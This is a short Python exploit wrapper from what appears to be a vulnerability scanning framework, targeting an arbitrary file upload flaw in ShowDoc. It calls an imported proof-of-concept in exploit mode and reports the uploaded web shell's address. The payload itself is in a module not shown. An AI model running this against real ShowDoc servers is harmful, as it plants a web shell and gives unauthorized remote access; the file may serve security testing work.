# -*- coding:utf-8 -*-
# ShowDoc 任意文件上传
from ServiceScanModel.models import ServiceScan
from .showdoc_poc import POC

from VulnScanModel.models import VulnScan

class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        result = poc.showdoc_poc(self.vuln.url, cmd, content, "exp")
        return "上传成功，shell地址：\n%s" % result
